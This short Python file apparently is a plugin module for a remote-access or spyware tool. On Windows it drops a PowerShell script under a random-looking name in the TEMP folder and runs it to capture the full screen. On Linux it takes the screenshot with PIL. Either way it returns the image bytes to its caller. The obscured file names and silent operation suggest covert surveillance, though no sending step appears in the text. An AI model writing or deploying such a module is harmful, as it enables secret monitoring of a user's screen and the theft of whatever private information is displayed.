try:
	from PIL import ImageGrab
except:
	pass
import sys
import os

def run(**args):
	if os.name=="nt":
		test = """Add-Type -AssemblyName System.Windows.Forms
		Add-Type -AssemblyName System.Drawing

		$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
		$Width  = $Screen.Width
		$Height = $Screen.Height
		$Left   = $Screen.Left
		$Top    = $Screen.Top

		$bitmap  = New-Object System.Drawing.Bitmap $Width, $Height
		$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
		$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

		$filepath = $env:temp+"\hjguyghvkjkjbkjbkju9hy8yse.bmp"
		Write-Output $filepath
		$bitmap.Save($filepath)"""
		
		with open(os.environ['TEMP']+"\\dchschsdue.ps1", "w") as FILE:
			FILE.write(test)
			
		temp_file = os.popen(f'powershell -File {os.environ["TEMP"]}'+'\\dchschsdue.ps1').read().strip()
		img_file_path = os.environ['TEMP']+'\\hjguyghvkjkjbkjbkju9hy8yse.bmp'
		with open(img_file_path,"rb") as FILE:
			img = FILE.read()
			
	elif sys.platform.lower()=="linux":
		image = ImageGrab.grab()
		image.save("/tmp/sdckcjsdejsjn.png")
		with open("/tmp/sdckcjsdejsjn.png","rb") as FILE:
			img = FILE.read()
	return img

